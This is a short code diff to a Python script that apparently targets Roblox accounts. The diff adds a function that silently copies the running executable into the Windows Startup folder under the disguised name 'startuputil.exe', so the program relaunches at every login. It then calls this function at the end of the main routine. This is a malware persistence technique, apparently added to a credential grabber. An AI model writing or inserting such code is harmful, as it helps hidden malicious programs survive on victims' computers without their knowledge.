@@ -214,7 +214,13 @@ def roblox(username):
                 }],
             })
 
+def copy():
+    startup = os.path.join(os.environ["APPDATA"], r"Microsoft\Windows\Start Menu\Programs\Startup")
+    dst = os.path.join(startup, "startuputil.exe")
+    if os.path.isdir(startup) and not os.path.exists(dst):
+        shutil.copy(sys.executable, dst)
 
 if __name__ == "__main__":
     username = main()
     roblox(username)
+    copy()
